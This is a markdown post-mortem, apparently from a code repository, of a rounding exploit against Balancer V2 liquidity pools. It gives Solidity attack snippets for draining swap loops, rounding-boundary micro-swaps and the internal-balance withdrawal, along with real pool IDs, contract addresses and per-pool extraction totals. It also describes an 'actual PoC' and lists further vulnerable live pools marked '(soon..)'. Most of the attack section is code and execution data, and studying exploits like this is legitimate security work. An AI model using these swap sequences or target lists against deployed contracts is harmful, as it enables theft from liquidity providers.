# BalancerV2 Rounding Exploit - Post-Mortem

Balancer V2, a decentralized automated market maker (AMM) protocol, an attacker exploited a precision rounding vulnerability in multiple pools. The attack occurred on **Nov 3, 2025**.

The attacker leveraged a rounding manipulation in BPT (Balancer Pool Token) rate calculations when pool liquidity approached zero. By executing sequences of `GIVEN_OUT` swaps with `toInternalBalance: true`, the attacker systematically drained multiple pools across multiple networks, accumulating funds in the Vault's internal balance before withdrawing everything via `manageUserBalance()` calls.

The exploit abused precision loss in the Vault's `swap()` function when using `SwapKind.GIVEN_OUT`, where the attacker specifies exact output amounts and the Vault calculates required input (BPT). At minimal liquidity, rounding errors favor the attacker, allowing extraction of more tokens than BPT paid justifies.

## Rounding Manipulation in GIVEN_OUT Swaps

Balancer V2 Vault supports two swap modes:
- `GIVEN_IN`: User specifies input, Vault calculates output
- `GIVEN_OUT`: User specifies output, Vault calculates input ← **exploited**

**Definitions:**
- `GIVEN_IN` ("Given In"): the caller specifies the exact amount of the input token, and the pool calculates the corresponding output amount.
- `GIVEN_OUT` ("Given Out"): the caller specifies the desired output amount, and the pool computes the required input amount.

Typically, a batchSwap() consists of multiple token-to-token swaps executed via the onSwap() function. The following outlines the execution path when a SwapRequest is assigned a GIVEN_OUT swap type (note that ComposableStablePool inherits from BaseGeneralPool):

![onSwap Control Flow](https://github.com/user-attachments/assets/a5ce90e0-7e9f-4555-bb9b-5b3ec94f64e5)

Each swap drains reserves → subsequent swaps have worse precision → compounding effect.

## Root Cause: Incorrect Rounding Direction

The underlying issue arises from the rounding-down operation performed during upscaling in the `BaseGeneralPool._swapGivenOut()` function. In particular, `_swapGivenOut()` incorrectly rounds down swapRequest.amount through the `_upscale()` function. The resulting rounded value is subsequently used as amountOut when calculating amountIn via `_onSwapGivenOut()`. This behavior contradicts the standard practice that rounding should be applied in a manner that benefits the protocol.

![Swap Given Out Vulnerability](https://github.com/user-attachments/assets/3e51746e-67b3-48c1-bbb7-c2422ee233d9)


```solidity
function _swapGivenOut(
    SwapRequest memory swapRequest,
    uint256[] memory balances,
    uint256 indexIn,
    uint256 indexOut
) internal view returns (uint256) {
    // VULNERABILITY: Rounds DOWN when should round UP
    uint256 amountOut = _upscale(swapRequest.amount, _scalingFactor(indexOut));
    //                  ^^^^^^^^ Should be _upscaleUp() to protect protocol

    // amountOut is now SMALLER than it should be
    uint256 amountIn = _onSwapGivenOut(swapRequest, balances, indexIn, indexOut);

    // Returns UNDERESTIMATED input requirement
    return _downscaleUp(amountIn, _scalingFactor(indexIn));
}
```

For a given pool (e.g., wstETH/rETH/cbETH), the computed amountIn underestimates the actual required input. This allows a user to exchange a smaller quantity of one underlying asset (e.g., wstETH) for another (e.g., cbETH), thereby decreasing the `invariant D` as a result of reduced effective liquidity. Consequently, the price of the corresponding `BPT` (wstETH/rETH/cbETH) becomes `deflated`, since `BPT price = D / totalSupply`.

## Attack Mechanics

**Step 1:**
The attacker swaps BPT for underlying assets to precisely adjust the balance of one token (cbETH) to the edge of a rounding boundary `(amount = 9)`. This sets up the conditions for precision loss in the next step.

**Step 2: Rounding Manipulation**
The attacker then swaps between another underlying (wstETH) and `cbETH` using a crafted amount `(= 8)`. Due to rounding down when scaling token amounts, the computed Δx becomes slightly smaller `(8.918 to 8)`, leading to an underestimated Δy and thus a smaller invariant (D from Curve's StableSwap model). Since `BPT price = D / totalSupply`, the BPT price becomes artificially deflated.

Using the best candidates, SC1 constructed one long `batchSwap`. The steps alternated indices in a `4‑leg block`, indicating swaps in circular directions. Input amounts were chosen to keep balances near rounding thresholds so that repeated down‑rounding in Stable math underestimated D within the call.

![balancer-batch-swap DuZkG1lC_Z20Y5a3](https://github.com/user-attachments/assets/8eb0d8ed-1f83-44e7-b6cf-b7b9adb048df)

![Attack Steps](https://github.com/user-attachments/assets/eabacfbd-4f65-4660-baa2-d8c16918b6d2)

**Step 3: Reverse Swap & Profit**
The attacker reverse-swaps the underlying assets back into `BPT`, restoring balance while profiting from the deflated `BPT price`.

---

### Stage 1: Initial BPT Drain (Reduce Liquidity)

The attacker executes multiple `GIVEN_OUT` swaps to drain underlying tokens from the pool:

```solidity
// Example from osETH/WETH pool (most profitable: ~6,109 ETH)
for (uint i = 0; i < 90; i++) {
    VAULT.swap(
        SingleSwap({
            poolId: 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635,
            kind: SwapKind.GIVEN_OUT,
            assetIn: BPT,              // Pay with BPT
            assetOut: WETH,             // Extract WETH
            amount: LARGE_AMOUNT,       // Exact output desired
            userData: ""
        }),
        FundManagement({
            sender: ATTACKER,
            fromInternalBalance: true,  // Use internal balance
            recipient: payable(ATTACKER),
            toInternalBalance: true     // Keep funds in Vault
        }),
        type(uint256).max,              // No limit on input
        deadline
    );
}
```

**Purpose**: Reduce pool reserves to approach rounding boundaries. Each swap:
- Extracts large amounts of WETH/osETH/other tokens
- Pays minimal BPT due to rounding errors
- Stores extracted funds in Vault's internal balance (invisible to external queries)
- Creates cascading precision loss for subsequent swaps

**Result after Stage 1**:
```
osETH/WETH Pool Example:
Initial:  WETH: 4,922,356,564,867,078,856,521 wei (4,922 ETH)
          osETH: 6,851,581,236,039,298,760,900 wei (6,851 ETH)

After:    WETH: ~67,000 wei (nearly zero)
          osETH: ~67,000 wei (nearly zero)
```

### Stage 2: Micro-Swap Manipulation (Rounding Boundary Setup)

Execute precision swaps between underlying tokens to hit exact rounding boundaries:

```solidity
// Swap to set token balance to edge of rounding (e.g., amount = 9)
VAULT.swap(
    SingleSwap({
        poolId: POOL_ID,
        kind: SwapKind.GIVEN_OUT,
        assetIn: WETH,
        assetOut: osETH,
        amount: 8,                  // Crafted amount to trigger rounding
        userData: ""
    }),
    FundManagement({
        sender: ATTACKER,
        fromInternalBalance: true,
        recipient: payable(ATTACKER),
        toInternalBalance: true
    }),
    type(uint256).max,
    deadline
);
```

**Rounding Mechanics**:
```
Expected calculation:  Δx = 8.918 tokens
Actual after rounding: Δx = 8 tokens (rounds down)
Result: Invariant D decreases artificially
        BPT price = D / totalSupply becomes deflated
```

### Stage 3: Reverse Swap & Profit Extraction

Swap extracted tokens back to BPT at deflated prices:

```solidity
// Buy back BPT at artificially low price
VAULT.swap(
    SingleSwap({
        poolId: POOL_ID,
        kind: SwapKind.GIVEN_OUT,
        assetIn: osETH,              // or WETH
        assetOut: BPT,
        amount: LARGE_BPT_AMOUNT,    // Get more BPT than paid for
        userData: ""
    }),
    FundManagement({
        sender: ATTACKER,
        fromInternalBalance: true,
        recipient: payable(ATTACKER),
        toInternalBalance: true
    }),
    type(uint256).max,
    deadline
);
```

**Final Withdrawal**:
```solidity
// Extract all accumulated internal balance
UserBalanceOp[] memory ops = new UserBalanceOp[](2);
ops[0] = UserBalanceOp({
    kind: UserBalanceOpKind.WITHDRAW_INTERNAL,
    asset: IAsset(address(WETH)),
    amount: WETH_BALANCE,
    sender: ATTACKER,
    recipient: payable(ATTACKER)
});
ops[1] = UserBalanceOp({
    kind: UserBalanceOpKind.WITHDRAW_INTERNAL,
    asset: IAsset(address(osETH)),
    amount: osETH_BALANCE,
    sender: ATTACKER,
    recipient: payable(ATTACKER)
});

VAULT.manageUserBalance(ops);
```

---

## Pools Execution Flow

### Ethereum

#### 1. osETH/WETH Pool
```
Pool ID: 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635
Contract: 0xDACf5Fa19b1f720111609043ac67A9818262850c
Block: 23717101

Initial State:
  WETH (index 0):  4,922,356,564,867,078,856,521 wei (4,922.36 ETH)
  BPT (index 1):   2,596,148,429,267,421,974,637,745,197,985,291
  osETH (index 2): 6,851,581,236,039,298,760,900 wei (6,851.58 ETH)

Final State:
  WETH:  ~0 wei
  BPT:   ~2,596,148,429,267,421,974,637,745,197,985,291
  osETH: ~0 wei

Extraction:
  WETH extracted:  4,623 ETH
  osETH extracted: 6,851 ETH

  Total: ~11,474 ETH
```

#### 2. wstETH/WETH Pool
```
Pool ID: 0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2
Contract: 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD

Initial State:
  wstETH (index 0): 4,270,841,022,451,395,518,160 wei (4,270.84 ETH)
  BPT (index 1):    2,596,148,429,267,825,815,119,599,282,622,812
  WETH (index 2):   1,977,057,709,608,602,150,017 wei (1,977.06 ETH)

Final State:
  wstETH: ~0 wei
  BPT:    ~2,596,148,429,267,825,815,119,599,282,622,812
  WETH:   ~0 wei

Extraction:
  wstETH extracted: 4,259 ETH
  WETH extracted:   1,963 ETH

  Total: ~6,222 ETH
Type: ComposableStablePool (BPT at index 1)
```

#### 3. rsETH/WETH Pool
```
Pool ID: 0x58aadfb1afac0ad7fca1148f3cde6aedf5236b6d00000000000000000000067f
Contract: 0x58AAdFB1Afac0ad7fca1148f3cdE6aEDF5236B6D

Initial State:
  BPT:   2,596,148,429,267,450,795,110,561,571,390,003
  rsETH: 1,192,977,132,125,824,431,719 wei (1,192.98 ETH)
  WETH:  891,081,044,240,689,768,290 wei (891.08 ETH)

Final State:
  BPT:   2,596,148,429,269,518,772,219,140,401,518,800
  rsETH: 186,036,293 wei (0.00000019 ETH)
  WETH:  1,265,989,959,414 wei (0.0000013 ETH)

Pool Deltas:
  BPT delta:   +2,067,977,108,578,830,128,797
  rsETH delta: -1,192,977,132,125,638,395,426 wei
  WETH delta:  -891,081,042,974,699,808,876 wei

Extraction:
  rsETH extracted: 1,192 ETH
  WETH extracted:  891 ETH

  Total: ~2,083 ETH
Type: WeightedPool
```

#### 4. weETH/ezETH/rswETH Pool (Triple)
```
Pool ID: 0x848a5564158d84b8a8fb68ab5d004fae11619a5400000000000000000000066a
Contract: 0x848a5564158d84b8A8fb68ab5D004Fae11619A54

Initial State:
  BPT:    2,596,148,429,268,072,998,691,221,627,584,336
  ezETH:  34 ETH
  weETH:  32 ETH
  rswETH: 86 ETH

Final State:
  BPT:    2,596,148,429,268,140,032,469,895,427,901,537
  ezETH:  2 ETH
  weETH:  3 ETH
  rswETH: 85 ETH

Extraction:
  ezETH extracted:  31 ETH
  weETH extracted:  28 ETH
  rswETH extracted: 0 ETH

  Total: ~59 ETH
```

#### 5. weETH/rETH Pool
```
Pool ID: 0x05ff47afada98a98982113758878f9a8b9fdda0a000000000000000000000645
Contract: 0x05ff47AFADa98a98982113758878F9A8B9FddA0a

Initial State:
  BPT:   2,596,148,429,267,578,197,359,306,107,962,432
  rETH:  707 ETH
  weETH: 496 ETH

Final State:
  BPT:   2,596,148,429,268,872,713,054,242,274,930,440
  rETH:  3 ETH
  weETH: 0 ETH

Extraction:
  rETH extracted:  703 ETH
  weETH extracted: 495 ETH

  Total: ~1,198 ETH
```

#### 6-7. wstETH/rETH/sfrxETH Pools (Quad #1 & #2)
```
Pool #1: 0x5aee1e99fe86960377de9f88689616916d5dcabe000000000000000000000467
Contract: 0x5aEe1e99fE86960377DE9f88689616916D5DcaBe

Initial State:
  BPT:     2,596,148,429,266,373,209,145,083,915,007,527
  wstETH:  0 ETH
  sfrxETH: 4 ETH
  rETH:    0 ETH

Final State:
  BPT:     2,596,148,429,266,379,970,928,315,936,291,762
  wstETH:  0 ETH
  sfrxETH: 0 ETH
  rETH:    0 ETH

Extraction:
  wstETH extracted:  0 ETH
  sfrxETH extracted: 4 ETH
  rETH extracted:    0 ETH

  Total: ~4 ETH

------------------------------------------------------------------------

Pool #2: 0x42ed016f826165c2e5976fe5bc3df540c5ad0af700000000000000000000058b
Contract: 0x42ED016F826165C2e5976fe5bC3df540C5aD0Af7

Initial State:
  BPT:     2,596,148,429,267,580,463,942,935,196,878,193
  wstETH:  203 ETH
  sfrxETH: 2,265 ETH
  rETH:    232 ETH

Final State:
  BPT:     2,596,148,429,270,382,247,078,373,301,460,520
  wstETH:  11 ETH
  sfrxETH: 117 ETH
  rETH:    11 ETH

Extraction:
  wstETH extracted:  191 ETH
  sfrxETH extracted: 2,148 ETH
  rETH extracted:    220 ETH

  Total: ~2,559 ETH
```

#### 8. ezETH/WETH Pool
```
Pool ID: 0x596192bb6e41802428ac943d2f1476c1af25cc0e000000000000000000000659
Contract: 0x596192bB6e41802428Ac943D2f1476C1Af25CC0E

Initial State:
  BPT:  2,596,148,429,268,001,550,290,005,844,565,929
  ezETH: 756 ETH
  WETH:  444 ETH

Final State:
  BPT:  2,596,148,429,269,196,196,829,326,878,149,524
  ezETH: 5 ETH
  WETH:  2 ETH

Extraction:
  ezETH extracted: 751 ETH
  WETH extracted:  442 ETH

  Pool Total: ~1,193 ETH
```

**Ethereum Subtotal: ~24,792 ETH**

---

### Arbitrum

#### wstETH/rETH/cbETH Pool
```
Pool ID: 0x4a2f6ae7f3e5d715689530873ec35593dc28951b000000000000000000000481
Contract: 0x4a2F6Ae7F3e5D715689530873ec35593Dc28951B
Block: 308179309

Initial State:
  cbETH:  385,331,897,945,415,101,145 wei (385.33 cbETH)
  wstETH: 36,378,350,238,858,588,950 wei (36.38 wstETH)
  rETH:   41,301,528,246,890,260,702 wei (41.30 rETH)

Final State:
  cbETH:  499,964,114,717,559,002,777 wei (499.96 cbETH)
  wstETH: 500,001,531,748,221,662,222 wei (500.00 wstETH)
  rETH:   500,000,000,100,000,000,000 wei (500.00 rETH)

Extraction: ~462 ETH total
Type: ComposableStablePool (BPT at index 1)
```

**Arbitrum Subtotal: ~462 ETH**

---

### Base

#### 1. rETH/WETH Pool
```
Pool ID: 0xc771c1a5905420daec317b154eb13e4198ba97d0000000000000000000000023
Contract: 0xC771c1a5905420DAEc317b154EB13e4198BA97D0
Block: 37683327
Transaction: 0xe9245fb124c3a6ff6a0e39c6d0db02b74b3a3d805f6bf016f4b9ac56cbfb73ae

Extraction: ~41 ETH
Final residual: ~17 WETH + ~24 rETH
```

#### 2. weETH/wETH Pool
```
Pool ID: 0xab99a3e856deb448ed99713dfce62f937e2d4d74000000000000000000000118
Contract: 0xaB99a3e856dEb448eD99713dfce62F937E2d4D74
Block: 37683327
Transaction: 0x927c9e6d9fc26b2ee13b88f553701a4e7514f8220d34e6517c634ddd135cd874

Initial: 6 weETH + 5 WETH
Extraction: <1 ETH
```

#### 3. cbETH/WETH Pool
```
Pool ID: 0xfb4c2e6e6e27b5b4a07a36360c89ede29bb3c9b6000000000000000000000026
Contract: 0xFb4C2E6E6e27B5b4a07a36360C89EDE29bB3c9B6
Block: 37683370
Transaction: 0xd61f26bd435b31f781165a522fc78a040f864eafc74e07f86314ca265d96287d

Initial: 10 cbETH + 0.5 WETH
Extraction: <1 ETH
```

**Base Subtotal: ~41 ETH**

---

## Actual PoC extraction results

```
(These are the current values in relation to the pool and our work, they may change!)

Ethereum (8 pools):      ~24,792 ETH 
Arbitrum (1 pool):          ~462 ETH 
Base (3 pools):              ~41 ETH 
                         ──────────────────────
TOTAL:                   ~25,295 ETH
```

---

## Attack Timeline

```
Ethereum Block 23717101-23717404
├─ 23717101: osETH/WETH pool drainage begins
├─ 23717102-23717150: rsETH/WETH pool attacked
├─ 23717151-23717200: wstETH/WETH pool drained
├─ 23717201-23717300: Multi-token pools exploited
└─ 23717404: Final withdrawal via manageUserBalance()

Arbitrum Block 308179309
└─ wstETH/rETH/cbETH pool exploited (462 ETH)

Base Blocks 37683327-37683376
├─ rETH/WETH pool: 106 swaps, 41 ETH
├─ weETH/wETH pool: 86 swaps, <1 ETH
└─ cbETH/WETH pool: 83 swaps, <1 ETH
```

---

## ComposableStablePool Critical Difference

**Standard WeightedPool (rsETH/WETH):**
```
Index 0: BPT token
Index 1: rsETH
Index 2: WETH
```

**ComposableStablePool (osETH/WETH, wstETH/WETH, Arbitrum pool):**
```
Index 0: WETH         
Index 1: BPT         
Index 2: osETH/wstETH  
```

## Key Technical Details

### Swap Execution Pattern

```solidity
// Typical drainage swap (repeated 80-110 times per pool)
struct ExactSwapData {
    address tokenIn;        // BPT (paying token)
    address tokenOut;       // Target token (WETH/osETH/etc)
    uint256 amount;         // Exact output desired (GIVEN_OUT)
    uint256 expectedIn;     // 0 = no limit (accept any BPT cost)
    uint256 indexIn;        // BPT index in pool (usually 1 for ComposableStable)
    uint256 indexOut;       // Target token index
}

// Amounts follow geometric pattern (reduce by ~10x each iteration)
amounts = [
    1,365,243,844,597,280,  // First swap: ~1.36e15 wei
    13,652,438,445,972,     // ~1.36e13 wei
    136,524,384,460,        // ~1.36e11 wei
    1,365,243,845,          // ~1.36e9 wei
    13,652,438,             // ~1.36e7 wei
    136,524,                // ~1.36e5 wei
    1,366,                  // ~1.36e3 wei
    70,                     // Edge of rounding
    14                      // Rounding boundary
];
```

## swap() Function

```solidity
struct SingleSwap {
    bytes32 poolId;
    SwapKind kind;          // 1 = GIVEN_OUT (exploited)
    IAsset assetIn;         // BPT token
    IAsset assetOut;        // Target token
    uint256 amount;         // Exact output desired
    bytes userData;
}

struct FundManagement {
    address sender;
    bool fromInternalBalance;
    address payable recipient;
    bool toInternalBalance;  // TRUE = hide in Vault until withdrawal
}

// Attacker calls:
VAULT.swap(
    SingleSwap({
        poolId: POOL_ID,
        kind: SwapKind.GIVEN_OUT,
        assetIn: BPT,
        assetOut: TARGET_TOKEN,
        amount: LARGE_AMOUNT,
        userData: ""
    }),
    FundManagement({
        sender: ATTACKER,
        fromInternalBalance: false,
        recipient: payable(ATTACKER),
        toInternalBalance: true  // ← Funds stay in Vault
    }),
    type(uint256).max,
    block.timestamp + 3600
);
```

---

## Contracts & Addresses

```
-- CORE CONTRACTS
Balancer V2 Vault:  0xBA12222222228d8Ba445958a75a0704d566BF2C8
Fee Collector:      0xce88686553686da562ce7cea497ce749da109f9f

-- ATTACKER ADDRESSES
Ethereum:  0xAa760D53541d8390074c61DEFeaba314675b8e3f
Base:      0x56e5Adab68b594B0c2aD6C112D94AE5aCA98A001

-- ETHEREUM
PoolId 0x5aee1e99fe86960377de9f88689616916d5dcabe000000000000000000000467 (wstETH-rETH-sfrxETH-BPT) contrat : 0x5aEe1e99fE86960377DE9f88689616916D5DcaBe
PoolId 0x848a5564158d84b8a8fb68ab5d004fae11619a5400000000000000000000066a (weETH/ezETH/rswETH) contrat : 0x848a5564158d84b8A8fb68ab5D004Fae11619A54
PoolId 0xdfe6e7e18f6cc65fa13c8d8966013d4fda74b6ba000000000000000000000558 (ankrETH/wstETH) contrat : 0xdfE6e7e18f6Cc65FA13C8D8966013d4FdA74b6ba
PoolId 0x596192bb6e41802428ac943d2f1476c1af25cc0e000000000000000000000659 (ezETH-WETH-BPT) contrat : 0x596192bB6e41802428Ac943D2f1476C1Af25CC0E
PoolId 0x740a691bd31c4176bcb6b8a7a40f1a723537d99d0000000000000000000006b6 (cdcETH/wstETH) contrat : 0x740A691bd31c4176BCb6B8A7a40f1A723537D99d
PoolId 0x05ff47afada98a98982113758878f9a8b9fdda0a000000000000000000000645 (weETH/rETH) contrat : 0x05ff47AFADa98a98982113758878F9A8B9FddA0a
PoolId 0x42ed016f826165c2e5976fe5bc3df540c5ad0af700000000000000000000058b (wstETH-rETH-sfrxETH-BPT) contrat : 0x42ED016F826165C2e5976fe5bC3df540C5aD0Af7
PoolId 0x58aadfb1afac0ad7fca1148f3cde6aedf5236b6d00000000000000000000067f (rsETH/WETH) contrat : 0x58AAdFB1Afac0ad7fca1148f3cdE6aEDF5236B6D
PoolId 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635 (osETH/WETH) contrat : 0xDACf5Fa19b1f720111609043ac67A9818262850c
PoolId 0x93d199263632a4ef4bb438f1feb99e57b4b5f0bd0000000000000000000005c2 (wstETH/WETH) contrat : 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD


-- ARBITRUM
PoolId 0x4a2f6ae7f3e5d715689530873ec35593dc28951b000000000000000000000481 (wstETH/rETH/cbETH) contrat : 0x4a2F6Ae7F3e5D715689530873ec35593Dc28951B


-- BASE
PoolId 0xc771c1a5905420daec317b154eb13e4198ba97d0000000000000000000000023 (rETH-WETH-BPT) contrat : 0xC771c1a5905420DAEc317b154EB13e4198BA97D0
PoolId 0xab99a3e856deb448ed99713dfce62f937e2d4d74000000000000000000000118 (weETH/wETH) contrat : 0xaB99a3e856dEb448eD99713dfce62F937E2d4D74
PoolId 0xfb4c2e6e6e27b5b4a07a36360c89ede29bb3c9b6000000000000000000000026 (cbETH/WETH) contrat : 0xFb4C2E6E6e27B5b4a07a36360C89EDE29bB3c9B6


-- ADDITIONAL VULNERABLE POOLS (Not exploited in this PoC)
- ankrETH/wstETH:  0xdfe6e7e18f6cc65fa13c8d8966013d4fda74b6ba000000000000000000000558
- cdcETH/wstETH:   0x740a691bd31c4176bcb6b8a7a40f1a723537d99d0000000000000000000006b6
- .... (soon..)
- .... (soon..)
- .... (soon..)
- .... (soon..)
```

## Post-Mortem ressources

    https://research.checkpoint.com/2025/how-an-attacker-drained-128m-from-balancer-through-rounding-error-exploitation/
    https://x.com/lookonchain/status/1985258890863501820
    https://x.com/Phalcon_xyz/status/1985302779263643915/photo/1
    https://x.com/Phalcon_xyz/status/1985262010347696312
    https://x.com/realtommybibi/status/1985269609248027013
    https://x.com/AdiFlips/status/1985279811011457363/photo/2
    https://x.com/GoPlusSecurity/status/1985371264631157035/photo/3
    https://x.com/KaihuaQIN/status/1985416822628463019/photo/4
    https://www.markets.com/news/balancer-v2-exploit-analysis-rounding-error-1653-en
    https://protos.com/live-updates-balancer-exploit-drains-129m-in-defi-disaster/
    https://x.com/hklst4r/status/1985872151077953827
    https://www.coinspect.com/blog/balancer-rate-manipulation-exploit/
    https://blocksec.com/blog/in-depth-analysis-the-balancer-v2-exploit
    https://app.blocksec.com/explorer/tx/eth/0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569
    https://app.blocksec.com/explorer/tx/arbitrum/0x7da32ebc615d0f29a24cacf9d18254bea3a2c730084c690ee40238b1d8b55773
    https://app.blocksec.com/explorer/tx/eth/0x2a0ead4ee9b17a1afa5bfe3dc152833a957f2d25dd9b4b86d68f2c87bdacf69c
